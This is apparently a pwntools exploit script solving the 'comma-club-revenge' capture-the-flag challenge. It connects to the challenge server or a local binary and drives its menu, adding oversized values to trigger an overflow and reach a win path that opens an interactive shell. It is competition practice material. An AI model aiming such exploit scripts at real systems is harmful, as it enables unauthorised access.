from pwn import *
from icecream import ic

elf = exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("comma-club-revenge.chal.hackthe.vote", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(a.ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

maxval = 783926

def view():
    sla(b">", b"2")

def add_start():
    sla(b">", b"1")

def add_end():
    sla(b">", b"3")

def add(val):
    sla(b">", b"2")
    sla(b">", f"{val}".encode())

def win():
    sla(b">", b"3")
    sla(b">", b"Total")

add_start()
add(maxval)
add(10000)
add_end()

view()

add_start()
for i in range(10):
    add(maxval)
add(9)
add_end()

view()
win()

io.interactive()
